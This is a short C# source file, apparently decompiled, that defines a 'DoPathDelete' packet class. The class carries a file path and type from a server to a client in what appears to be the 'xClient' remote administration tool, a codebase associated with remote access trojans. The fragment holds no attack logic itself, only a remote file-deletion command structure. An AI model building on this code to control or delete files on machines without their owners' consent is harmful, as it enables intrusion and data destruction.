using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoPathDelete : GInterface4
{
	public string Path { get; set; }

	public GEnum1 PathType { get; set; }

	public DoPathDelete()
	{
	}

	public DoPathDelete(string path, GEnum1 pathtype)
	{
		Path = path;
		PathType = pathtype;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
